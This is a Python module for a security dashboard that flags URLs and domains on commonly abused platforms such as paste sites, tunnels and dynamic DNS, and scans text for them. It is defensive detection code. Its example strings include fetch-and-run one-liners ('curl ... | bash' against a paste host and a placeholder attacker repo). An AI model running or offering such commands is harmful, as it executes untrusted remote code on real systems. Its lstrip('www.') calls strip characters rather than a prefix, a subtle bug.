"""
URL and domain heuristic layer.

Catches commonly-abused-but-legitimate platforms that TI feeds never list
as malicious (paste sites, temp file hosts, URL shorteners, dynamic DNS,
raw code hosting, free tunnels).  Returns a SuspiciousMatch — lower
confidence than a TI IOC hit, rendered amber in the dashboard.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Sequence


@dataclass(frozen=True)
class SuspiciousMatch:
    value: str
    category: str        # e.g. "Paste Site", "Dynamic DNS"
    reason: str          # human-readable explanation
    confidence: int      # 0-100 (lower than confirmed TI hits)
    example_abuse: str   # one-line abuse scenario for context

    def __str__(self) -> str:
        return f"[SUSPICIOUS:{self.category}] {self.reason} (confidence {self.confidence}%)"


# ─── Platform registry ────────────────────────────────────────────────────────

@dataclass
class _Platform:
    domains: list[str]          # exact domain or suffix match
    category: str
    reason: str
    confidence: int
    example_abuse: str
    raw_path_boost: int = 0     # extra confidence when path looks like raw content


_PLATFORMS: list[_Platform] = [
    # ── Paste sites ──────────────────────────────────────────────────────────
    _Platform(
        domains=["pastebin.com", "pastebin.pl", "pastebin.fr"],
        category="Paste Site",
        reason="Pastebin is widely used by malware for C2 configuration, payload staging, and data exfiltration",
        confidence=55,
        example_abuse="Emotet, QakBot, and RATs commonly fetch stage-2 payloads from pastebin.com/raw/",
        raw_path_boost=25,
    ),
    _Platform(
        domains=["hastebin.com", "hastebin.skyra.pw"],
        category="Paste Site",
        reason="Hastebin used for payload hosting and stolen credential dumps",
        confidence=55,
        example_abuse="Credential dumps and PowerShell loaders staged via hastebin raw URLs",
        raw_path_boost=25,
    ),
    _Platform(
        domains=["ghostbin.com", "ghostbin.co"],
        category="Paste Site",
        reason="Ghostbin used for anonymous malware staging",
        confidence=55,
        example_abuse="Anonymous paste service used for C2 scripts and exfiltrated data",
        raw_path_boost=20,
    ),
    _Platform(
        domains=["paste.ee", "paste.debian.net", "dpaste.com", "privatebin.net"],
        category="Paste Site",
        reason="Paste service commonly used for payload staging or data dumps",
        confidence=45,
        example_abuse="Attacker-controlled paste URLs used as stage-2 payload sources",
        raw_path_boost=20,
    ),
    _Platform(
        domains=["rentry.co", "rentry.org"],
        category="Paste Site",
        reason="Markdown paste service used in phishing and payload delivery chains",
        confidence=50,
        example_abuse="Phishing pages and PowerShell one-liners hosted on rentry.co",
        raw_path_boost=20,
    ),

    # ── Temp / anonymous file hosts ───────────────────────────────────────────
    _Platform(
        domains=["transfer.sh"],
        category="Temp File Host",
        reason="transfer.sh is designed for anonymous file transfers — heavily used for payload delivery and exfiltration",
        confidence=70,
        example_abuse="Attackers upload implants to transfer.sh and pull them via curl in shell one-liners",
    ),
    _Platform(
        domains=["file.io"],
        category="Temp File Host",
        reason="Ephemeral file hosting used for payload staging (auto-deletes after download)",
        confidence=65,
        example_abuse="Single-use download links used to evade URL reputation checks",
    ),
    _Platform(
        domains=["gofile.io"],
        category="Temp File Host",
        reason="Anonymous file host used for malware distribution",
        confidence=60,
        example_abuse="Malware archives uploaded and linked from phishing emails",
    ),
    _Platform(
        domains=["anonfiles.com", "bayfiles.com", "megaupload.nz"],
        category="Temp File Host",
        reason="Anonymous file host with history of malware distribution",
        confidence=65,
        example_abuse="Ransomware and RAT payloads distributed via anonymous file hosts",
    ),
    _Platform(
        domains=["0x0.st", "ix.io", "sprunge.us"],
        category="Paste / File Host",
        reason="Minimal anonymous paste/file host used in shell injection chains",
        confidence=60,
        example_abuse="curl 0x0.st/xxx | bash — common one-liner attack pattern",
        raw_path_boost=20,
    ),

    # ── URL shorteners ────────────────────────────────────────────────────────
    _Platform(
        domains=["bit.ly", "bitly.com"],
        category="URL Shortener",
        reason="URL shortener masks final destination — commonly used in phishing and malspam",
        confidence=45,
        example_abuse="Phishing links and malicious redirects hidden behind bit.ly short URLs",
    ),
    _Platform(
        domains=["tinyurl.com"],
        category="URL Shortener",
        reason="URL shortener used to obscure malicious destinations",
        confidence=40,
        example_abuse="Malspam campaigns use tinyurl to bypass URL reputation filters",
    ),
    _Platform(
        domains=["t.co"],
        category="URL Shortener",
        reason="Twitter's URL shortener — used in social engineering and phishing chains",
        confidence=35,
        example_abuse="Spear-phishing links distributed via Twitter/X DMs",
    ),
    _Platform(
        domains=["cutt.ly", "short.io", "rb.gy", "is.gd", "v.gd", "ow.ly", "tiny.cc"],
        category="URL Shortener",
        reason="URL shortener masks destination — moderate phishing risk",
        confidence=40,
        example_abuse="Phishing and malspam redirect chains",
    ),

    # ── Dynamic DNS ───────────────────────────────────────────────────────────
    _Platform(
        domains=["duckdns.org"],
        category="Dynamic DNS",
        reason="Free dynamic DNS used by attackers for C2 infrastructure (survives IP rotation)",
        confidence=65,
        example_abuse="C2 domains on DuckDNS survive IP changes — common in RAT campaigns",
    ),
    _Platform(
        domains=["no-ip.com", "no-ip.org", "ddns.net", "hopto.org", "zapto.org", "servebeer.com"],
        category="Dynamic DNS",
        reason="Free dynamic DNS provider widely used for attacker C2 infrastructure",
        confidence=65,
        example_abuse="Njrat, DarkComet, and other RATs commonly use No-IP domains for C2",
    ),
    _Platform(
        domains=["dynu.com", "changeip.com", "dnsdynamic.org", "afraid.org"],
        category="Dynamic DNS",
        reason="Free dynamic DNS used by threat actors for persistent C2 naming",
        confidence=60,
        example_abuse="Persistent C2 naming that survives IP rotation",
    ),

    # ── Free tunnels / reverse proxies ────────────────────────────────────────
    _Platform(
        domains=["ngrok.io", "ngrok.app", "ngrok-free.app"],
        category="Tunnel Service",
        reason="ngrok exposes localhost to the internet — used for exfiltration and C2 callbacks",
        confidence=70,
        example_abuse="Reverse shells and data exfiltration tunneled via ngrok to bypass egress controls",
    ),
    _Platform(
        domains=["serveo.net", "localhost.run"],
        category="Tunnel Service",
        reason="SSH tunnel service used to bypass firewall egress controls",
        confidence=65,
        example_abuse="Reverse shell callbacks via SSH tunnel to bypass firewall rules",
    ),
    _Platform(
        domains=["trycloudflare.com", "cfargotunnel.com"],
        category="Tunnel Service",
        reason="Cloudflare tunnel used to expose internal services — abused for C2",
        confidence=60,
        example_abuse="Cloudflare tunnels used to host phishing pages and C2 panels",
    ),
    _Platform(
        domains=["pagekite.me"],
        category="Tunnel Service",
        reason="Tunnel service used to expose internal hosts — C2 evasion vector",
        confidence=55,
        example_abuse="C2 traffic tunneled via pagekite to evade network controls",
    ),

    # ── Raw code hosting ──────────────────────────────────────────────────────
    _Platform(
        domains=["raw.githubusercontent.com"],
        category="Raw Code Hosting",
        reason="Raw GitHub content hosting — attackers host payloads in public/private repos",
        confidence=45,
        example_abuse="curl raw.githubusercontent.com/attacker/repo/main/payload.sh | bash",
        raw_path_boost=15,
    ),
    _Platform(
        domains=["gist.github.com"],
        category="Raw Code Hosting",
        reason="GitHub Gist used for anonymous payload hosting and C2 configuration",
        confidence=50,
        example_abuse="PowerShell and bash loaders fetched from GitHub Gists",
        raw_path_boost=20,
    ),
    _Platform(
        domains=["gitlab.com"],
        category="Raw Code Hosting",
        reason="GitLab raw content used for payload staging",
        confidence=35,
        example_abuse="Attacker repos on GitLab used to stage malware",
        raw_path_boost=20,
    ),
    _Platform(
        domains=["codeberg.org"],
        category="Raw Code Hosting",
        reason="Open-source Git host used for payload staging",
        confidence=35,
        example_abuse="Malware repos hosted on Codeberg for payload delivery",
        raw_path_boost=15,
    ),

    # ── Cryptocurrency / anonymity ────────────────────────────────────────────
    _Platform(
        domains=["torproject.org", "onion.to", "tor2web.org", "onion.ly", "onion.sh"],
        category="Tor Gateway",
        reason="Tor gateway/proxy — accessing .onion services via clearnet bridge",
        confidence=75,
        example_abuse="Ransomware payment portals and C2 panels accessed via Tor gateways",
    ),
    _Platform(
        domains=["proxyscrape.com", "free-proxy-list.net", "sslproxies.org"],
        category="Proxy List",
        reason="Proxy aggregator — used by attackers to rotate IPs during attacks",
        confidence=60,
        example_abuse="Credential stuffing and scanning tools using rotating proxy lists",
    ),
]

# Build fast lookup: domain suffix → platform
_SUFFIX_MAP: dict[str, _Platform] = {}
for _p in _PLATFORMS:
    for _d in _p.domains:
        _SUFFIX_MAP[_d.lower()] = _p


# ─── URL pattern detectors ────────────────────────────────────────────────────

_RAW_PATH_RE = re.compile(
    r"/raw/|/raw$|/download|/dl/|\.sh$|\.ps1$|\.bat$|\.exe$|\.py$|\.vbs$",
    re.IGNORECASE,
)

_IP_URL_RE = re.compile(
    r"https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}",
    re.IGNORECASE,
)

_DOMAIN_RE = re.compile(
    r"(?:https?://)?([a-z0-9\-]+(?:\.[a-z0-9\-]+)+)",
    re.IGNORECASE,
)


def _extract_domain(value: str) -> str:
    """Pull bare domain from a URL or return the value as-is."""
    m = re.match(r"https?://([^/\?:#]+)", value, re.IGNORECASE)
    return m.group(1).lower().lstrip("www.") if m else value.lower().lstrip("www.")


def _match_platform(domain: str) -> _Platform | None:
    """Return the Platform entry for this domain, checking suffixes."""
    domain = domain.lower().lstrip("www.")
    # Exact match
    if domain in _SUFFIX_MAP:
        return _SUFFIX_MAP[domain]
    # Suffix match: check if domain ends with any registered key
    for key, platform in _SUFFIX_MAP.items():
        if domain == key or domain.endswith("." + key):
            return platform
    return None


# ─── Public API ──────────────────────────────────────────────────────────────

def check_url(url: str) -> SuspiciousMatch | None:
    """
    Check a URL against the suspicious platform registry.
    Returns a SuspiciousMatch or None if clean.
    """
    domain = _extract_domain(url)
    platform = _match_platform(domain)
    if not platform:
        # Bare IP URL — always suspicious
        if _IP_URL_RE.match(url):
            return SuspiciousMatch(
                value=url,
                category="Bare IP URL",
                reason="HTTP/S connection directly to an IP address (no domain) — common in malware C2 and payload delivery",
                confidence=70,
                example_abuse="Malware beacons and payload downloads over bare IP:port URLs",
            )
        return None

    confidence = platform.confidence
    if platform.raw_path_boost and _RAW_PATH_RE.search(url):
        confidence = min(95, confidence + platform.raw_path_boost)

    return SuspiciousMatch(
        value=url,
        category=platform.category,
        reason=platform.reason,
        confidence=confidence,
        example_abuse=platform.example_abuse,
    )


def check_domain(domain: str) -> SuspiciousMatch | None:
    """Check a bare domain against the suspicious platform registry."""
    domain = domain.lower().lstrip("www.")
    platform = _match_platform(domain)
    if not platform:
        return None
    return SuspiciousMatch(
        value=domain,
        category=platform.category,
        reason=platform.reason,
        confidence=platform.confidence,
        example_abuse=platform.example_abuse,
    )


def check_value(value: str) -> SuspiciousMatch | None:
    """Auto-detect type and check."""
    v = value.strip()
    if re.match(r"https?://", v, re.IGNORECASE):
        return check_url(v)
    return check_domain(v)


def check_text(text: str) -> list[SuspiciousMatch]:
    """
    Scan a block of text (alert description, evidence, log lines) for
    suspicious platform references.  Returns one match per unique domain.
    """
    results: list[SuspiciousMatch] = []
    seen_domains: set[str] = set()   # deduplicate by registered domain

    # Find all URLs — one result per unique domain
    for url in re.findall(r"https?://[^\s\"'<>]+", text, re.IGNORECASE):
        domain = _extract_domain(url)
        if domain in seen_domains:
            continue
        m = check_url(url)
        if m:
            seen_domains.add(domain)
            results.append(m)

    # Find bare IP:port (without http://)
    for ip_match in re.finditer(r"\b(\d{1,3}(?:\.\d{1,3}){3}):(\d{2,5})\b", text):
        key = ip_match.group(0)
        if key not in seen_domains:
            seen_domains.add(key)
            results.append(SuspiciousMatch(
                value=key,
                category="Bare IP:Port",
                reason="Direct IP:port connection — common in malware C2 beacons",
                confidence=60,
                example_abuse="RAT and botnet C2 over direct IP:port connections",
            ))

    # Find bare domains not already caught via URL scan
    for domain in re.findall(r"\b([a-z0-9\-]+(?:\.[a-z0-9\-]+){1,3})\b", text, re.IGNORECASE):
        d = domain.lower()
        if d in seen_domains:
            continue
        m = check_domain(d)
        if m:
            seen_domains.add(d)
            results.append(m)

    return results
